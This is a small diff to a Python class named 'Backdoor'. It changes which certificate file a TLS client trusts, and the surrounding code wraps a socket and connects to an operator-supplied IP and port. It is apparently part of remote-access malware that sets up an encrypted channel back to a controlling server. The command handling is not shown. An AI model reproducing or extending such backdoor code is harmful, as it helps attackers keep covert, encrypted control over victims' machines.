@@ -16,7 +16,7 @@ class Backdoor:
         self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         self.context.minimum_version = ssl.TLSVersion.TLSv1_2
         self.context.maximum_version = ssl.TLSVersion.TLSv1_3
-        self.context.load_verify_locations('server-cert.pem')
+        self.context.load_verify_locations('ca.crt')
         self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.connection= self.context.wrap_socket(self.connection, server_hostname='smitk')
         self.connection.connect((ip,port))
